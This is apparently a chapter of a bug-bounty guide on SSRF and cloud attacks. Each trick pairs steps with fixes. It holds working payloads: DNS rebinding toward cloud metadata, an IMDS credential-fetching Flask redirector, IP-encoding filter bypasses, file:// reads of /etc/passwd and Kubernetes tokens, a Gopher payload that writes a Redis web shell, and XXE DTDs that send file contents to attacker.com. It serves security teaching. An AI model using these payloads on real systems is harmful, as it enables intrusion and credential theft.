# 🌐 SSRF & Cloud (Tricks #7–#13)

> ⚠️ **Disclaimer:** Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

SSRF remains one of the highest-paid bug classes because it chains directly
into **cloud credential theft**. The tricks below cover modern bypasses,
DNS rebinding, IMDSv2 evasion, and non-HTTP protocols that filters forget.

---

## Table of Contents

1. [DNS Rebinding to Bypass SSRF Allowlists](#trick-7)
2. [Steal Backend Authorization Headers via Unvalidated Webhooks](#trick-8)
3. [IMDSv2 Bypass Using an External Redirector](#trick-9)
4. [Bypass SSRF Filters with IPv6, Decimal, and Octal IPs](#trick-10)
5. [Exploit PDF/Thumbnail Generators for Blind SSRF](#trick-11)
6. [Access Cloud Metadata via file/gopher/dict](#trick-12)
7. [Force SSRF Through XML Parsers (XXE → SSRF)](#trick-13)

---

<a name="trick-7"></a>
## 🧩 Trick #7 — DNS Rebinding to Bypass SSRF Allowlists

**Category:** SSRF
**Impact:** Critical
**Tools:** `dnsFookup`, `rebind.network`, custom DNS server

### The Idea
The target resolves your domain at **validation time** and sees a benign IP
that passes the allowlist. Moments later, when the backend actually fetches
the URL, the DNS record has flipped to `169.254.169.254` (cloud metadata).
The validation was on the wrong resolution.

### Steps

1. **Set up a rebinding DNS server** (e.g., [dnsFookup](https://github.com/makuga/dnsFookup)) with TTL 0.

2. **Configure responses:**
   - **First N queries:** `1.2.3.4` (benign, allowlisted)
   - **Subsequent queries:** `169.254.169.254` (metadata)

3. **Submit your domain** as the URL in the vulnerable parameter:
   ```
   url=http://rebind.attacker.com/latest/meta-data/iam/security-credentials/
   ```

4. **Race the resolution:**
   - First call → passes allowlist check
   - Second call (fetch) → hits metadata

5. **Capture credentials** in your listener.

### Why It Works
- Validation and fetch happen at different times.
- Many filters only check the hostname, not the resolved IP at fetch time.
- TTL 0 forces re-resolution on every request.

### Fix
- Resolve once, pin the IP for the request.
- Block link-local (`169.254.0.0/16`) and private ranges at egress.
- Enforce IMDSv2 with hop limit = 1.

### References
- [AWS IMDS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)

---

<a name="trick-8"></a>
## 🧩 Trick #8 — Steal Backend Authorization Headers via Unvalidated Webhooks

**Category:** SSRF
**Impact:** Critical (token leakage → account takeover)
**Tools:** `interactsh`, `ngrok`, `Burp Collaborator`

### The Idea
When a service fetches a user-supplied URL (PDF generator, webhook tester,
repo importer, avatar fetcher), the backend often attaches its **own
`Authorization` header** to the outbound request. If the destination isn't
validated, you point it at your server and harvest the token.

### Steps

1. **Find a URL-fetching feature:**
   - PDF/preview generator
   - Webhook test button
   - Avatar-from-URL
   - Repo/import from Git URL
   - RSS/feed subscriber
   - Slack/Microsoft Teams integration preview

2. **Spin up a listener:**
   ```bash
   interactsh-client
   # or
   python3 -m http.server 8000
   ```

3. **Supply your listener URL** in the feature.

4. **Inspect incoming headers:**
   ```
   Authorization: Bearer eyJ...
   Cookie: session=...
   X-API-Key: ...
   ```

5. **Replay the token** against the app's API — often grants admin or
   internal-service access.

### Why It Works
Backend integrations frequently attach their **service account** token to
outbound requests, assuming the destination is trusted. When the destination
is user-controlled, the token leaks.

### Fix
- Strip sensitive headers on outbound requests.
- Allowlist destination domains.
- Use per-destination scoped tokens.
- Never attach internal auth to user-supplied URLs.

---

<a name="trick-9"></a>
## 🧩 Trick #9 — IMDSv2 Bypass Using an External Redirector

**Category:** SSRF
**Impact:** Critical
**Tools:** Your own HTTP server, `curl`

### The Idea
IMDSv2 requires a `PUT /latest/api/token` before reading metadata, which
most SSRF primitives can't do. But if the vulnerable server **follows
redirects**, you can host a redirector that performs the IMDSv2 dance and
returns the credential response to the victim server.

### Steps

1. **Host a redirector** that:
   - Accepts a request from the target
   - Internally performs `PUT http://169.254.169.254/latest/api/token`
   - Uses the token to `GET /latest/meta-data/iam/security-credentials/`
   - Returns the response body to the target

   Example (Python/Flask):
   ```python
   from flask import Flask, request
   import requests

   app = Flask(__name__)

   @app.route("/")
   def index():
       token = requests.put(
           "http://169.254.169.254/latest/api/token",
           headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
       ).text
       creds = requests.get(
           "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
           headers={"X-aws-ec2-metadata-token": token}
       ).text
       return creds
   ```

2. **Point the vulnerable SSRF** at your redirector.

3. **Read the returned credentials** in the SSRF response (if reflected) or
   in your redirector logs.

### Why It Works
- The victim server's outbound request hits your redirector first.
- Your redirector performs IMDSv2 on **its own behalf** — but if you can
  reach the victim's IMDS via a shared network or via the redirect, you
  extract creds.
- Alternatively, some SSRF sinks **follow redirects to link-local IPs**,
  letting you point them at `169.254.169.254` after a redirect.

### Fix
- Enforce IMDSv2 **plus** hop limit = 1.
- Block `169.254.169.254` at the network layer.
- Disable redirect following in HTTP clients.
- Use IAM roles with minimal permissions.

### References
- [AWS: IMDSv2 configuration](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)

---

<a name="trick-10"></a>
## 🧩 Trick #10 — Bypass SSRF Filters with IPv6, Decimal, and Octal IPs

**Category:** SSRF
**Impact:** High
**Tools:** Burp, `curl`, CyberChef

### The Idea
Many SSRF filters only block the literal string `127.0.0.1` or
`169.254.169.254`. Alternate IP encodings bypass naive string checks.

### Payloads

**IPv6-mapped IPv4:**
```
http://[::ffff:127.0.0.1]/
http://[::ffff:169.254.169.254]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

**Decimal:**
```
http://2130706433/            # 127.0.0.1
http://2852039166/            # 169.254.169.254
```

**Octal:**
```
http://0177.0.0.1/
http://0251.0376.0251.0376/
```

**Hex:**
```
http://0x7f.0.0.1/
http://0xA9.0xFE.0xA9.0xFE/
```

**Mixed / shortened:**
```
http://127.1/
http://127.0.1/
http://0/
http://localhost/
http://localhost.localdomain/
http://127.0.0.1.nip.io/
http://spoofed.burpcollaborator.net/
```

**URL parser confusion:**
```
http://127.0.0.1:80@evil.com/
http://evil.com#@127.0.0.1/
http://evil.com\.127.0.0.1/
```

**DNS-based:**
```
http://localtest.me/          # resolves to 127.0.0.1
http://metadata.google.internal/
http://169.254.169.254.nip.io/
```

### Steps
1. Submit each payload to the URL parameter.
2. Watch for callback or internal response.
3. Compare responses (some filters leak "blocked" vs. "connection refused").

### Why It Works
Filters that only regex-match `127\.0\.0\.1` miss every alternative encoding.
Even `inet_aton`-style parsers accept decimal/octal forms.

### Fix
- Parse the URL with a strict parser.
- Normalize IP to canonical form.
- Validate **after** DNS resolution.
- Use an allowlist of hosts, not a denylist.

---

<a name="trick-11"></a>
## 🧩 Trick #11 — Exploit PDF/Thumbnail Generators for Blind SSRF

**Category:** SSRF
**Impact:** High
**Tools:** `interactsh`, HTML injection payload

### The Idea
Services that convert HTML → PDF or render thumbnails (headless Chrome,
wkhtmltopdf, Puppeteer) often load external resources. This gives you
**blind SSRF** with full render context — sometimes even JS execution in a
sandboxed browser.

### Steps

1. **Find the feature:**
   - Invoice/receipt PDF export
   - Resume/CV preview
   - Screenshot/thumbnail generation
   - HTML email preview

2. **Inject an external resource:**
   ```html
   <img src="http://interactsh.oastify.com/probe">
   <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
   <link rel="stylesheet" href="http://interactsh.oastify.com/style.css">
   <script src="http://interactsh.oastify.com/x.js"></script>
   ```

3. **Watch for callbacks** in interactsh.

4. **Escalate:**
   - Read local files: `<iframe src="file:///etc/passwd">`
   - Hit internal services: `http://internal-api.local/`
   - Chain with DNS rebinding for metadata.

5. **If JS executes** in the renderer, you may reach deeper internal services
   via `fetch()`.

### Why It Works
Headless browsers treat HTML as a real page and load everything. Renderers
often run with broad network access.

### Fix
- Disable external resource loading (`--disable-remote-fonts`, network
  sandbox).
- Run renderers in a network-isolated container.
- Block link-local + private ranges at egress.

---

<a name="trick-12"></a>
## 🧩 Trick #12 — Access Cloud Metadata via `file://`, `gopher://`, `dict://`

**Category:** SSRF
**Impact:** Critical
**Tools:** Burp, custom URL scheme handling

### The Idea
Filters that only block `http://` and `https://` often allow **other
schemes**. `file://` reads local files. `gopher://` and `dict://` speak raw
TCP to internal services (Redis, Memcached, SMTP).

### Payloads

**Local file read:**
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

**Gopher → Redis RCE:**
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%244%0D%0Aid%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

**Dict → Memcached:**
```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get:session_key
```

**Kubernetes service account token:**
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Steps
1. Try every scheme in the URL parameter.
2. Observe response — some sinks reflect file contents.
3. For gopher, use a **Gopherus**-generated payload for the target service.
4. For Kubernetes, use the SA token to query the API server.

### Why It Works
URL parsers support many schemes. Filters commonly whitelist `http(s)` but
don't explicitly deny others.

### Fix
- Whitelist URL schemes (only `https://`).
- Reject non-HTTP schemes at parse time.
- Network egress rules blocking everything except allowlisted hosts.

### References
- [Gopherus — Gopher payload generator](https://github.com/tarunkant/Gopherus)

---

<a name="trick-13"></a>
## 🧩 Trick #13 — Force SSRF Through XML Parsers (XXE → SSRF)

**Category:** SSRF / XXE
**Impact:** Critical
**Tools:** Burp, `xxe-exploit`

### The Idea
XML parsers that allow external entities (XXE) can be abused to make HTTP
requests from the server — turning any XXE into SSRF. This bypasses SSRF
filters entirely because the request originates from the XML parser, not a
URL parameter.

### Payloads

**Basic external entity:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://interactsh.oastify.com/">
]>
<root>&xxe;</root>
```

**Read cloud metadata:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

**Blind XXE (out-of-band):**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
```

**evil.dtd:**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

**Parameter entity in DOCTYPE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<root>&content;</root>
```

### Steps
1. Find XML input points: SOAP endpoints, SAML, RSS, SVG upload, DOCX/XLSX.
2. Inject a `DOCTYPE` with an external entity.
3. Watch for interactsh callbacks or reflected file contents.
4. For blind, host an evil DTD that exfiltrates via a second request.

### Why It Works
XML parsers with `resolve_entities=True` (default in many libraries) fetch
external resources. SSRF filters on URL parameters are irrelevant here.

### Fix
- Disable DTDs / external entities in every XML parser:
  - Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  - Python: `defusedxml`
  - PHP: `libxml_disable_entity_loader(true)`
- Block outbound HTTP from XML parsing services.
- Validate and sanitize XML input.

### References
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

## 📌 Quick Reference Summary

| # | Trick                          | Impact   | Effort |
|---|--------------------------------|----------|--------|
| 7 | DNS rebinding                  | Critical | Medium |
| 8 | Backend auth header theft      | Critical | Low    |
| 9 | IMDSv2 redirector bypass       | Critical | Medium |
| 10| IP encoding bypasses           | High     | Low    |
| 11| PDF/thumbnail blind SSRF       | High     | Low    |
| 12| file/gopher/dict schemes       | Critical | Medium |
| 13| XXE → SSRF                     | Critical | Medium |

---

> **Prev:** [Recon & Attack Surface ←](01-recon.md)
> **Next:** [Race Conditions →](03-race-conditions.md)
